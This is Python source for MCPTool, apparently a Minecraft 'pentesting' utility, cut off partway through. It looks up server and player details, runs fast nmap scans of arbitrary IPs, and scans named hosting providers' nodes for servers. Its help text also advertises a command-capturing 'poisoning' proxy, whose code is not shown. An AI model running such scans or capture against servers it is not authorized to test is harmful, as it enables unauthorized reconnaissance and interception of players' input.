# =============================================================================
#                      MCPTool v1.7 www.github.com/wrrulos
#                         Pentesting Tool for Minecraft
#                               Made by wRRulos
#                                  @wrrulos
# =============================================================================

# Any error report it to my discord please, thank you.
# Programmed in Python 3.10.1

import hashlib
import os
import time
import requests
import json
import re
import socket
import uuid
import subprocess
import shutil
import base64

from datetime import datetime
from colorama import Fore, init

init()

DEBUG = False  # Activate DEBUG mode

# Variables

target = ""
scan_error = ""
host_ports = ""
qubo_error = ""
ngrok_command = ""

red = Fore.RED
lred = Fore.LIGHTRED_EX
black = Fore.BLACK
lblack = Fore.LIGHTBLACK_EX
white = Fore.WHITE
green = Fore.GREEN
lgreen = Fore.LIGHTGREEN_EX
lcyan = Fore.LIGHTCYAN_EX
lmagenta = Fore.LIGHTMAGENTA_EX
yellow = Fore.YELLOW
lyellow = Fore.LIGHTYELLOW_EX
reset = Fore.RESET

urlmcsrv = "https://api.mcsrvstat.us/2/"
urlmojang = "https://api.mojang.com/users/profiles/minecraft/"
version_url = "https://raw.githubusercontent.com/wrrulos/MCPTool/main/config/data/version"
urlngrok = "http://localhost:4040/api/tunnels"
discord = "discord.gg/ewPyW4Ghzj"

animation = "|/-\\"
animation_two = "54321"

last_version = 0
script_version = 8
script_version_two = "1.7"

host_list = ["minehost", "holyhosting", "vultam"]

banner = f"""\n
    {red}███╗   ███╗ ██████╗██████╗     ████████╗ ██████╗  ██████╗ ██╗         {lred}Telegram: {white}wrrulos
    {red}████╗ ████║██╔════╝██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║         {lred}Discord: {white}Rulo#9224
    {red}██╔████╔██║██║     ██████╔╝       ██║   ██║   ██║██║   ██║██║         {lred}Github: {white}@wrrulos
    {white}██║╚██╔╝██║██║     ██╔═══╝        ██║   ██║   ██║██║   ██║██║     
    {white}██║ ╚═╝ ██║╚██████╗██║            ██║   ╚██████╔╝╚██████╔╝███████╗    {lred}Minecraft Pentesting Tool {lgreen}v{str(script_version_two)}
    {white}╚═╝     ╚═╝ ╚═════╝╚═╝            ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝\n\n"""

banner_two = f"""
\n\n\n\n\n\n\n\n\n                          {red}`7MMM.     ,MMF' .g8'''bgd `7MM'''Mq. MMP''MM''YMM              `7MM  
                            {red}MMMb    dPMM .dP'     `M   MM   `MM.P'   MM   `7                MM 
                            {red}M YM   ,M MM dM'       `   MM   ,M9      MM  ,pW'Wq.   ,pW'Wq.  MM                         
                            {red}M  Mb  M' MM MM            MMmmdM9       MM 6W'   `Wb 6W'   `Wb M
                            {white}M  YM.P'  MM MM.           MM            MM 8M     M8 8M     M8 MM
                            {white}M  `YM'   MM `Mb.     ,'   MM            MM YA.   ,A9 YA.   ,A9 MM  
                          {white}.JML. `'  .JMML. `'bmmmd'  .JMML.        .JMML.`Ybmd9'   `Ybmd9'.JMML.  \n\n\n"""

help_message = """
     ╔═════════════════════════════════════════════╦═══════════════════════════════════════════════════╗
     ║                   Command                   ║                    Function                       ║
     ║                                             ║                                                   ║
     ║═════════════════════════════════════════════║═══════════════════════════════════════════════════║
     ║ server [ip]                                 ║ Displays information about a server.              ║
     ║ player [name]                               ║ Displays information about a player.              ║
     ║ scan [ip] [ports]                           ║ Scan the ports of an IP. (Includes port range)    ║
     ║ qubo [ip] [ports] [th] [ti]                 ║ Scan the ports of an IP using quboscanner.        ║
     ║ host [host] [ports]                         ║ Scans the nodes of a host.                        ║
     ║ subd [ip] [file]                            ║ Scans the nodes of a host.                        ║
     ║ bungee [ip:port]                            ║ Start a proxy server.                             ║
     ║ poisoning [server]                          ║ Create a proxy connection that redirects to a     ║
     ║                                             ║ server and captures commands                      ║
     ║                                             ║                                                   ║
     ║ discord                                     ║ Show my server link                               ║   
     ║ clear                                       ║ Clean the screen.                                 ║
     ╚═════════════════════════════════════════════╩═══════════════════════════════════════════════════╝"""


def error():
    print(ERROR_MCPTOOL)


def check_folder(folder):
    """ Check if the following folders exist """
    if not folder == "config":
        if os.path.isdir(folder):
            pass

        else:
            os.mkdir(folder)

    else:
        if os.path.isdir(folder):
            pass

        else:
            error()


def check_file(file):
    """ Check if the file exist """

    if os.path.isfile(file):
        f = open(file, "w+", encoding="utf8")
        f.truncate(0)
        f.close()
        pass

    else:
        f = open(file, "w")
        f.close()


def check_update():
    """ Check if an update is available """

    global last_version

    r = requests.get(version_url)
    last_version = r.text

    if int(last_version) > int(script_version):
        print(f"{white}                                           {lgreen}New version available on my github.\n\n{white}                                               https://github.com/wrrulos/\n\n")

        time.sleep(2)

        for i in range(5):
            print(f"{white}                                      Starting MCPTool with the current version in{lcyan} {animation_two[i % len(animation_two)]}", end="\r")
            i += 1
            time.sleep(1)

        clear()
        print(banner)

    else:
        clear()
        print(banner_two)

        print(f"{white}                                           You are using the latest version!\n\n")

        time.sleep(2)
        clear()
        print(banner)


def check_connection():
    """ Check the connection """

    requests.get("https://www.google.com")


def clear():
    """ Clean the screen """

    if os.name == "nt":
        os.system("cls")

    else:
        os.system("clear")


def check_nmap_error(scan_file):
    """ Check if nmap arguments are valid """

    global scan_error, target

    f = open(scan_file)
    content = f.read()
    f.close()

    if "Ports specified must be between 0 and 65535 inclusive" in content:
        scan_error = "ports"
        error()

    elif "Your port specifications are illegal." in content:
        scan_error = "ports"
        error()

    elif "Found no matches for the service mask" in content:
        scan_error = "ports"
        error()

    elif f'Failed to resolve "{target}".' in content:
        scan_error = "target"
        error()

    elif "QUITTING!" in content:
        scan_error = "unknown"
        error()

    else:
        pass


def check_java():
    """ Check if java is installed """

    if os.system("java -version >nul 2>&1") == 0:
        pass

    else:
        error()


def check_nmap():
    """ Check if nmap is installed """

    if os.system("nmap --version >nul 2>&1") == 0:
        pass

    else:
        error()


def check_ngrok():
    global ngrok_command
    """ Check if ngrok is installed """

    if os.name == "nt":
        if os.path.isfile("ngrok.exe"):
            ngrok_command = "ngrok.exe tcp 25568"
            pass

        else:
            error()

    else:
        if os.system("ngrok -v >nul 2>&1") == 0:
            ngrok_command = "ngrok tcp 25568"
            pass

        else:
            if os.path.isfile("ngrok"):
                ngrok_command = "./ngrok tcp 25565"
                pass

            else:
                error()


def check_qubo(threads, timeout):
    """ Check if the arguments is valid """

    global qubo_error

    if threads.isdecimal():
        pass

    else:
        qubo_error = "threads"
        error()

    if timeout.isdecimal():
        pass

    else:
        qubo_error = "timeout"
        error()


def check_host_ports():
    """ Check if the ports are valid """

    global host_ports

    if host_ports.lower() == "all":
        host_ports = "0-65535"

    elif host_ports.isdecimal():
        if int(host_ports) <= 65535:
            pass

        else:
            error()

    else:
        host_ports = host_ports.split("-")

        if int(host_ports[0]) >= int(host_ports[1]):
            error()

        if int(host_ports[1]) > 65535:
            error()

        host_ports = f"{str(host_ports[0])}-{str(host_ports[1])}"


def check_os():
    """ Check the operating system """

    if os.name == "nt":
        os.system(f"title MCPTool v{str(script_version_two)}")

        if not DEBUG:
            start()

        mcptool()

    else:
        if os.path.exists("/data/data/com.termux/files/home"):
            print("\nMCPTool is not currently compatible with Termux")
            exit()

        else:
            if not DEBUG:
                start()
            mcptool()


clear()


def start():
    """ Starting MCPTool """

    print(banner_two)

    for i in range(15):
        print(f"{white}                                                  Starting MCPTool..{animation[i % len(animation)]}", end="\r")
        i += 1
        time.sleep(0.2)

    try:
        clear()
        print(banner_two)

        for i in range(10):
            print(f"{white}                                               Loading configurations..{animation[i % len(animation)]}", end="\r")
            i += 1
            time.sleep(0.2)

        check_folder("config")

        try:
            clear()
            print(banner_two)

            for i in range(10):
                print(f"{white}                                               Checking the connection..{animation[i % len(animation)]}", end="\r")
                i += 1
                time.sleep(0.2)

            check_connection()

            try:
                clear()
                print(banner_two)

                for i in range(10):
                    print(f"{white}                                                Checking for updates..{animation[i % len(animation)]}", end="\r")
                    i += 1
                    time.sleep(0.2)

                try:
                    check_update()

                except Exception as e:
                    if DEBUG:
                        print(f"     [DEBUG] Exception #4 (start): {e}")

                    clear()
                    print(banner_two)

                    print(f"\n{white}                                      There was an error checking for updates..\n\n")

                    time.sleep(2)

                    for i in range(5):
                        print(f"{white}                                   Starting MCPTool with the current version in{lcyan} {animation_two[i % len(animation_two)]}", end="\r")
                        i += 1
                        time.sleep(1)

                    clear()
                    print(banner)

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception #3 (start): {e}")

                clear()
                print(banner_two)
                print(f"\n{white}                                      There was an error checking for updates..\n\n")

                time.sleep(2)

                for i in range(5):
                    print(f"{white}                                     Starting MCPTool with the current version in{lcyan} {animation_two[i % len(animation_two)]}", end="\r")
                    i += 1
                    time.sleep(1)

                clear()
                print(banner)

        except Exception as e:
            if DEBUG:
                print(f"     [DEBUG] Exception #2 (start): {e}")

            clear()
            print(banner_two)
            print(f"\n{white}                                      There was an error checking the connection.\n\n")

            time.sleep(2)

            for i in range(5):
                print(f"{white}                                     Starting MCPTool with the current version in{lcyan} {animation_two[i % len(animation_two)]}", end="\r")
                i += 1
                time.sleep(1)

            clear()
            print(banner)

    except Exception as e:

        if DEBUG:
            print(f"     [DEBUG] Exception #1 (start): {e}")

        clear()
        print(banner_two)
        print(f"\n{white}                                      There was an error loading the configuration.\n\n")
        time.sleep(2)

        for i in range(5):
            print(f"{white}                                     Starting MCPTool with the current version in{lcyan} {animation_two[i % len(animation_two)]}", end="\r")
            i += 1
            time.sleep(1)

        clear()
        print(banner)


def mcptool():
    """ Principal function """

    global target, scan_error, host_ports

    if DEBUG:
        print("\n     [#] MCPTool started in DEBUG mode\n")

    while True:
        if os.name == "nt":
            print(f"\n {red}    root@windows:~/MCPTool# {lblack}» {white} ", end="")

        else:
            print(f"\n {red}    root@linux:~/MCPTool# {lblack}» {white} ", end="")

        argument = input().split()

        if len(argument) == 0:
            print(f"\n     {lblack}[{red}-{lblack}] {lred}Unknown command. Type help to see the available commands.")

        try:
            command = argument[0]

            if command.lower() == "help":
                clear()
                print(banner)
                print(help_message)

            elif command.lower() == "clear" or command.lower() == "cls":
                clear()
                print(banner)

            elif command.lower() == "server" or command.lower() == "srv":
                try:
                    server = argument[1]
                    try:
                        check_connection()
                        try:
                            r = requests.get(urlmcsrv + server)
                            r_json = r.json()
                            ip = r_json["ip"]
                            port = r_json["port"]
                            clean = r_json["motd"]["clean"]
                            online_players = r_json["players"]["online"]
                            online_players_max = r_json["players"]["max"]
                            version = r_json["version"]

                            print(f"\n{white}     [{green}+{white}] IP: {lgreen}{str(ip)}")
                            print(f"{white}     [{green}+{white}] Port: {lgreen}{str(port)}")
                            print(f"{white}     [{green}+{white}] Version: {lgreen}{str(version)}")
                            print(f"{white}     [{green}+{white}] Players: {lgreen}{str(online_players)}/{str(online_players_max)}")

                            try:
                                print(f'{white}     [{green}+{white}] MOTD: {lgreen}{str(clean[0]).replace("  ", "")}{str(clean[1].replace("  ", ""))}')

                            except:
                                print(f'{white}     [{green}+{white}] MOTD: {lgreen}{str(clean[0]).replace("  ", "")}')

                        except KeyboardInterrupt:
                            print("")
                            continue

                        except Exception as e:
                            if DEBUG:
                                print(f"     [DEBUG] Exception #3 (Server): {e}")

                            print(f"\n     {white}[{red}-{white}] {lred}The server does not exist.")

                    except KeyboardInterrupt:
                        print("")
                        continue

                    except Exception as e:
                        if DEBUG:
                            print(f"     [DEBUG] Exception #2 (Server): {e}")

                        print(f"\n     {white}[{red}-{white}] {lred}Connection error.")

                except Exception as e:
                    if DEBUG:
                        print(f"     [DEBUG] Exception #1 (Server): {e}")

                    print(f"\n{white}     Usage: server [ip] or [ip:port]")

            elif command.lower() == "player" or command.lower() == "p":
                try:
                    player_name = argument[1]
                    try:
                        check_connection()
                        try:
                            r = requests.get(urlmojang + player_name)
                            r_json = r.json()
                            name = r_json["name"]
                            player_uuid = r_json["id"]
                            player_uuid_ = f'{player_uuid[0:8]}-{player_uuid[8:12]}-{player_uuid[12:16]}-{player_uuid[16:21]}-{player_uuid[21:32]}'

                            offline_player_uuid = str(uuid.UUID(bytes=hashlib.md5(bytes(f"OfflinePlayer:{player_name}", "utf-8")).digest()[:16], version=3))
                            offline_player_uuid_ = player_uuid.replace("-", "")

                            print(f"\n{white}     [{green}+{white}] Name: {lgreen}{str(name)}\n")
                            print(f"{white}     [{green}+{white}] UUID: {lgreen}{str(player_uuid_)}")
                            print(f"{white}     [{green}+{white}] UUID: {lgreen}{str(player_uuid)}")
                            print(f"{white}     [{green}+{white}] UUID (No Premium): {lgreen}{offline_player_uuid}")
                            print(f"{white}     [{green}+{white}] UUID (No Premium): {lgreen}{offline_player_uuid_}")

                        except Exception as e:
                            if DEBUG:
                                print(f"     [DEBUG] Exception #3 (player): {e}")

                            player_uuid = str(uuid.UUID(bytes=hashlib.md5(bytes(f"OfflinePlayer:{player_name}", "utf-8")).digest()[:16], version=3))
                            player_uuid_ = player_uuid.replace("-", "")

                            print(f"\n{white}     [{green}+{white}] Name: {lgreen}{str(player_name)}\n")
                            print(f"{white}     [{green}+{white}] UUID (No Premium): {lgreen}{player_uuid}")
                            print(f"{white}     [{green}+{white}] UUID (No Premium): {lgreen}{player_uuid_}")

                    except KeyboardInterrupt:
                        print("")
                        continue

                    except Exception as e:
                        if DEBUG:
                            print(f"     [DEBUG] Exception #2 (player): {e}")

                        print(f"\n     {white}[{red}-{white}] {lred}Connection error.")

                except Exception as e:
                    if DEBUG:
                        print(f"     [DEBUG] Exception #1 (player): {e}")

                    print(f"\n{white}     Usage: player [name]")

            elif command.lower() == "scan":
                try:
                    target = argument[1]
                    ports = argument[2].lower()

                    numservers = 0
                    ip_actual = ""

                    try:
                        check_nmap()
                        try:
                            check_connection()
                            try:
                                check_folder("results")
                                check_folder("results/scan")
                                data_file_date = datetime.now()

                                results_file = open(f"results/scan/Scan_{str(data_file_date.day)}-{str(data_file_date.month)}-{str(data_file_date.year)}_{str(data_file_date.hour)}.{str(data_file_date.minute)}.{str(data_file_date.second)}.txt", "w", encoding="utf8")
                                results_file.write("MCPTool @wrrulos \n\n")
                                results_file.write("Scan \n\n")
                                results_file.write("Information:\n\n")
                                results_file.write(f"    Date: {str(data_file_date.year)}-{str(data_file_date.month)}-{str(data_file_date.day)}\n")
                                results_file.write(f"    Hour: {str(data_file_date.hour)}.{str(data_file_date.minute)}.{str(data_file_date.second)}\n")
                                results_file.write(f"    Target: {str(target)}\n")
                                results_file.write(f"    Ports: {str(ports)}\n")

                                try:
                                    date = datetime.now()
                                    scan_file = f"temp_scan_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt"

                                    clear()
                                    print(banner)
                                    print(f"\n     {lblack}[{lgreen}+{lblack}] {white}Scanning{green} {target}{white}..")

                                    os.system(f"nmap -p {str(ports)} -T5 -Pn -v -oN {scan_file} {str(target)} >nul 2>&1")
                                    try:
                                        check_nmap_error(scan_file)
                                        try:
                                            new_scan_date = datetime.now()
                                            new_scan_results = f"new_temp_range_{str(new_scan_date.day)}-{str(new_scan_date.month)}-{str(new_scan_date.year)}_{str(new_scan_date.hour)}.{str(new_scan_date.minute)}.{str(new_scan_date.second)}.txt"
                                            scan_results = open(new_scan_results, "w+")

                                            with open(scan_file, encoding="utf8") as nmap_result:
                                                for line in nmap_result:
                                                    ip = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", line)
                                                    ip = " ".join(ip)
                                                    ip = ip.replace("(", "").replace(")", "")
                                                    port = re.findall("\d{1,5}\/tcp open", line)
                                                    port = " ".join(port)

                                                    if "." in ip:
                                                        ip_actual = ip

                                                    if "tcp" in port:
                                                        port = port.replace("/tcp open", "")
                                                        ip_actual_backup = ip_actual

                                                        try:
                                                            ip_actual = ip_actual.split(" ")
                                                            ip_actual = ip_actual[1]

                                                        except:
                                                            ip_actual = ip_actual_backup

                                                        scan_results.write(f"{ip_actual}:{port}\n")

                                                scan_results.close()

                                            try:
                                                with open(new_scan_results) as scan_results:
                                                    for line in scan_results:
                                                        line = line.split(":")
                                                        line[1] = line[1].replace("\n", "")
                                                        try:
                                                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                                            s.settimeout(2)
                                                            s.connect((line[0], int(line[1])))
                                                            s.send(b"\xfe\x01")
                                                            data = s.recv(1024)[3:].decode("utf-16be")[3:].split("\x00")
                                                            s.close()

                                                            version = re.sub(r"§[a-zA-Z0-9]", "", data[1].strip().replace("  ", "").replace("  ", ""))
                                                            motd = re.sub(r"§[a-zA-Z0-9]", "", data[2].strip().replace("  ", "").replace("  ", ""))
                                                            motd = motd.replace("\n", "")
                                                            players = re.sub(r"§[a-zA-Z0-9]", "", f"{data[3]}/{data[4]}".strip().replace("  ", "").replace("  ", ""))

                                                            numservers += 1

                                                            print(f"\n{white}     [{lgreen}√{white}] {green}Server found:")
                                                            print(f"\n{white}        IP: {lcyan}{str(line[0])}:{str(line[1])}")
                                                            print(f"        {white}MOTD: {lcyan}{str(motd)}")
                                                            print(f"        {white}Version: {lcyan}{str(version)}")
                                                            print(f"        {white}Players: {lcyan}{str(players)}\n")

                                                            results_file.write("\n[+] Server found: \n\n")
                                                            results_file.write(f"    IP: {str(line[0])}:{str(line[1])}\n")
                                                            results_file.write(f"    MOTD: {str(motd)}\n")
                                                            results_file.write(f"    Version: {str(version)}\n")
                                                            results_file.write(f"    Players: {str(players)}\n")

                                                        except socket.timeout:
                                                            print(f"\n{white}     [{lred}-{white}] {green}Server found: {red}(time out){green}: ")
                                                            print(f"\n        {white}IP: {lcyan}{str(line[0])}:{str(line[1])}")
                                                            results_file.write(f"\n[-] Server found (Offline)     IP: {str(line[0])}:{str(line[1])}\n")

                                                        except Exception as e:
                                                            if DEBUG:
                                                                print(f"     [DEBUG] Exception #8 (scan): {e}")

                                                            pass

                                                os.remove(scan_file)
                                                os.remove(new_scan_results)
                                                print(reset)

                                                if numservers == 1:
                                                    print(f"{white}     The scan ended and found {green}{str(numservers)} {white}server.")

                                                elif numservers == 0:
                                                    print(f"{white}     The scan ended and found {lred}{str(numservers)} {white}servers.")
                                                    results_file.write("\nNo servers found")

                                                else:
                                                    print(f"{white}     The scan ended and found {green}{str(numservers)} {white}servers.")

                                                print(f"\n     All scan data was saved in results/scan/Scan_{str(data_file_date.day)}-{str(data_file_date.month)}-{str(data_file_date.year)}_{str(data_file_date.hour)}.{str(data_file_date.minute)}.{str(data_file_date.second)}.txt {reset}")

                                                results_file.close()

                                            except KeyboardInterrupt:
                                                os.remove(scan_file)
                                                os.remove(new_scan_results)
                                                results_file.close()
                                                print("")
                                                continue

                                            except Exception as e:
                                                if DEBUG:
                                                    print(f"     [DEBUG] Exception #7 (scan): {e}")

                                        except KeyboardInterrupt:
                                            print("")
                                            continue

                                        except Exception as e:
                                            if DEBUG:
                                                print(f"     [DEBUG] Exception #6 (scan): {e}")

                                    except Exception as e:
                                        if DEBUG:
                                            print(f"     [DEBUG] Exception #5 (scan): {e}")

                                        os.remove(scan_file)

                                        if scan_error == "ports":
                                            print(f"\n     {white}[{lred}Invalid arguments{white}] {white}Please enter a valid port range")

                                        elif scan_error == "target":
                                            print(f"\n     {white}[{lred}Invalid arguments{white}] {white}Please enter a valid IP")

                                        elif scan_error == "unknown":
                                            print(f"\n     {white}[{lred}Invalid arguments{white}] {white}Enter the arguments correctly")

                                except KeyboardInterrupt:
                                    print("")
                                    continue

                                except Exception as e:
                                    if DEBUG:
                                        print(f"     [DEBUG] Exception #4 (scan): {e}")

                            except KeyboardInterrupt:
                                print("")
                                continue

                            except Exception as e:
                                if DEBUG:
                                    print(f"     [DEBUG] Exception #3 (scan): {e}")

                        except KeyboardInterrupt:
                            print("")
                            continue

                        except Exception as e:
                            if DEBUG:
                                print(f"     [DEBUG] Exception #2 (scan): {e}")

                            print(f"\n     {white}[{red}-{white}] {lred}Connection error.")

                    except KeyboardInterrupt:
                        print("")
                        continue

                    except Exception as e:
                        if DEBUG:
                            print(f"     [DEBUG] Exception #1 (scan): {e}")

                        print(f"\n     {white}[{red}-{white}] {lred}You don't have nmap installed.")

                except KeyboardInterrupt:
                    print("")
                    continue

                except Exception as e:
                    if DEBUG:
                        print(f"     [DEBUG] Exception #1 (scan): {e}")

                    print(f"\n{white}     Usage: scan [ip] [ports]")

            elif command.lower() == "host":
                try:
                    host = argument[1].lower()
                    host_ports = argument[2]

                    numservers = 0
                    num_nodes = 0
                    file = ""
                    nodes = ""
                    domain = ""
                    nmap_file = ""
                    results_file = ""
                    nodes_file = ""

                    try:
                        check_nmap()
                        try:
                            show_host_list = host_list
                            show_host_list = str(show_host_list).replace("[", "").replace("]", "").replace("'", "")
                            try:
                                if host in host_list:
                                    pass

                                else:
                                    error()

                                try:
                                    check_host_ports()
                                    try:
                                        check_connection()
                                        try:
                                            check_folder("results")
                                            check_folder("results/host")
                                            date = datetime.now()

                                            if host == "minehost":
                                                check_folder("results/host/minehost")
                                                nodes = ("sv1", "sv10", "sv11", "sv15", "sv16", "sv17")
                                                domain = ".minehost.com.ar"
                                                file = f"results/host/minehost/Minehost_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt"
                                                nmap_file = f"new_minehost_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt"

                                            elif host == "holyhosting":
                                                check_folder("results/host/holyhosting")
                                                nodes = ("node-germany", "node-newyork", "ca", "tx2", "node-cl2", "fr", "node-ashburn", "node-premium3", "node-dallas", "premium2", "node-valdivia", "node-premium")
                                                domain = ".holy.gg"
                                                file = f"results/host/holyhosting/Holyhosting_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt"
                                                nmap_file = f"new_holyhosting_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt"

                                            elif host == "vultam":
                                                check_folder("results/host/vultam")
                                                nodes = ("ca", "ca02", "ca03", "ca04", "ca05", "ca06", "ca07", "mia", "mia02", "mia03", "mia04", "mia05", "mia06", "mia07", "mia08", "mia09", "mia10", "mia12", "mia13", "mia14", "mia15", "mia16", "fr01", "fr02", "fr03", "ny", "ny02", "ny04", "ny05", "ny06", "ny07", "de", "de02")
                                                domain = ".vultam.net"
                                                file = f"results/host/vultam/Vultam_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt"
                                                nmap_file = f"new_vultam_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt"

                                            check_folder("results")
                                            check_folder("results/host")
                                            clear()

                                            print(banner)
                                            print(f"\n     {lblack}[{lgreen}#{lblack}] {white}Scanning the hosting {green}{host}{white}..")

                                            time.sleep(1)
                                            nodes_file = f"nodes_host_{str(host)}{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt"
                                            nodes_list = open(nodes_file, "w", encoding="utf8")
                                            nodes_list.truncate(0)

                                            results_file = open(file, "w", encoding="utf8")
                                            results_file.write("Host scan \n\n")
                                            results_file.write("Information:\n\n")
                                            results_file.write(f"    Date: {str(date.year)}-{str(date.month)}-{str(date.day)}\n")
                                            results_file.write(f"    Hour: {str(date.hour)}.{str(date.minute)}.{str(date.second)}\n")
                                            results_file.write(f"    Host: {str(host)}\n")
                                            results_file.write(f"    Ports: {str(host_ports)}\n")

                                            results_file.write(f"Found nodes: \n\n")

                                            print(f"\n     {lblack}[{lgreen}#{lblack}] {white}Searching for available nodes...")
                                            time.sleep(1)

                                            for node in nodes:
                                                try:
                                                    ip = socket.gethostbyname(f"{str(node)}{str(domain)}")
                                                    nodes_list.write("\n")
                                                    nodes_list.write(f"{str(ip)}\n")
                                                    results_file.write(f"Node: {str(node)}{str(domain)}    IP: {str(ip)}\n")
                                                    num_nodes += 1

                                                except:
                                                    pass

                                            if num_nodes == 0:
                                                print(f"\n     {lblack}[{lred}-{lblack}] {white}No active nodes were found. Try again later")
                                                continue

                                            else:
                                                print(f"\n     {lblack}[{lgreen}+{lblack}] {white}Found nodes: {num_nodes}\n")
                                                time.sleep(1)

                                            nodes_list.close()
                                            results_file.write("\n")
                                            ip_list = open(nodes_file, "r")

                                            for _ in ip_list:
                                                ip = ip_list.readline()
                                                ip = ip.replace("\n", "")

                                                print(f"\n     {lblack}[{lgreen}+{lblack}] {white}Scanning {green}{ip}\n")

                                                os.system(f"nmap -p {str(host_ports)} -T5 -Pn -v -oN {nmap_file} {str(ip)} >nul 2>&1")

                                                ports_result = []

                                                with open(nmap_file, encoding="utf8") as nmap_results:
                                                    for line in nmap_results:
                                                        port_found = re.findall("\d{1,5}\/tcp open", line)
                                                        port_found = " ".join(port_found)

                                                        if "tcp" in port_found:
                                                            port_found = port_found .replace("/tcp open", "")
                                                            ports_result.append(port_found)

                                                    for port in ports_result:
                                                        try:
                                                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                                            s.settimeout(2)
                                                            s.connect((ip, int(port)))
                                                            s.send(b"\xfe\x01")
                                                            data = s.recv(1024)[3:].decode("utf-16be")[3:].split("\x00")
                                                            s.close()

                                                            version = re.sub(r"§[a-zA-Z0-9]", "", data[1].strip().replace("  ", "").replace("  ", ""))
                                                            motd = re.sub(r"§[a-zA-Z0-9]", "", data[2].strip().replace("  ", "").replace("  ", ""))
                                                            motd = motd.replace("\n", "")
                                                            players = re.sub(r"§[a-zA-Z0-9]", "", f"{data[3]}/{data[4]}".strip().replace("  ", "").replace("  ", ""))
                                                            numservers += 1

                                                            print(f"\n{white}     [{lgreen}√{white}] {green}Server found:")
                                                            print(f"\n{white}        IP: {lcyan}{str(ip)}:{str(port)}")
                                                            print(f"        {white}MOTD: {lcyan}{str(motd)}")
                                                            print(f"        {white}Version: {lcyan}{str(version)}")
                                                            print(f"        {white}Players: {lcyan}{str(players)}\n")

                                                            results_file.write("\n[+] Server found: \n\n")
                                                            results_file.write(f"    IP: {str(ip)}:{str(port)}\n")
                                                            results_file.write(f"    MOTD: {str(motd)}\n")
                                                            results_file.write(f"    Version: {str(version)}\n")
                                                            results_file.write(f"    Players: {str(players)}\n")

                                                        except socket.timeout:
                                                            print(f"\n{white}     [{lred}-{white}] {green}Server found: {red}(time out){green}: ")
                                                            print(f"\n        {white}IP: {lcyan}{str(ip)}:{str(port)}\n")
                                                            results_file.write(f"\n[-] Server found (Offline)     IP: {str(ip)}:{str(port)}\n\n")

                                                        except Exception as e:
                                                            if DEBUG:
                                                                print(f"     [DEBUG] Exception #8 (host): {e}")

                                                            pass

                                            if numservers == 1:
                                                print(f"{white}     The scan ended and found {green}{str(numservers)} {white}server.")

                                            elif numservers == 0:
                                                print(f"{white}     The scan ended and found {lred}{str(numservers)} {white}servers.")
                                                results_file.write("No servers found")

                                            else:
                                                print(f"{white}     The scan ended and found {green}{str(numservers)} {white}servers.")

                                            print(f"\n     All scan data was saved in results/host/{str(host)}_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt {reset}")

                                            results_file.close()
                                            ip_list.close()
                                            os.remove(nodes_file)
                                            os.remove(nmap_file)

                                        except KeyboardInterrupt:
                                            results_file.close()
                                            os.remove(nodes_file)
                                            os.remove(nmap_file)
                                            print("")
                                            continue

                                        except Exception as e:
                                            if DEBUG:
                                                print(f"     [DEBUG] Exception #7 (host): {e}")

                                    except KeyboardInterrupt:
                                        print("")
                                        continue

                                    except Exception as e:
                                        if DEBUG:
                                            print(f"     [DEBUG] Exception #6 (host): {e}")

                                        print(f"\n     {white}[{red}-{white}] {lred}Connection error.")

                                except KeyboardInterrupt:
                                    print("")
                                    continue

                                except Exception as e:
                                    if DEBUG:
                                        print(f"     [DEBUG] Exception #5 (host): {e}")

                                    print(f"\n     {white}[{lred}Invalid arguments{white}] {white}Please enter a valid port range")

                            except KeyboardInterrupt:
                                print("")
                                continue

                            except Exception as e:
                                if DEBUG:
                                    print(f"     [DEBUG] Exception #4 (host): {e}")

                                print(f"\n     {white}[{lred}Invalid arguments{white}] {white}Host not found.")
                                print(f"     {white}Availables host: {green}{str(show_host_list)}")

                        except KeyboardInterrupt:
                            print("")
                            continue

                        except Exception as e:
                            if DEBUG:
                                print(f"     [DEBUG] Exception #3 (host): {e}")

                            print(f"\n     {white}[{lred}ERROR{white}] {white}There is a problem with the variable {red}host_list {white}({str(error)})")

                    except KeyboardInterrupt:
                        print("")
                        continue

                    except Exception as e:
                        if DEBUG:
                            print(f"     [DEBUG] Exception #2 (host): {e}")

                        print(f"\n     {white}[{red}-{white}] {lred}You don't have nmap installed.")

                except KeyboardInterrupt:
                    print("")
                    continue

                except Exception as e:
                    if DEBUG:
                        print(f"     [DEBUG] Exception #1 (host): {e}")

                    print(f"\n{white}     Usage: host [host] [ports]")

            elif command.lower() == "qubo":
                try:
                    ip = argument[1]
                    ports = argument[2]
                    threads = argument[3]
                    timeout = argument[4]

                    results_file = ""
                    numservers = 0
                    qubo_file = "unknown"
                    qubo_ips = []

                    try:
                        check_qubo(threads, timeout)
                        try:
                            date = datetime.now()
                            check_folder("results")
                            check_folder("results/qubo")
                            check_folder("config/qubo/outputs")
                            file_list = os.listdir("config/qubo/outputs")

                            clear()
                            print(banner)
                            print(f"\n     {lblack}[{lgreen}+{lblack}] {white}Scanning{green} {ip} {white}with quboscanner...")
                            os.system(f"cd config/qubo && java -Dfile.encoding=UTF-8 -jar qubo.jar -range {ip} -ports {ports} -th {threads} -ti {timeout} >nul 2>&1")
                            new_file_list = os.listdir("config/qubo/outputs")

                            for file in new_file_list:
                                if file in file_list:
                                    pass
                                else:
                                    qubo_file = file

                            try:
                                if qubo_file == "unknown":
                                    error()

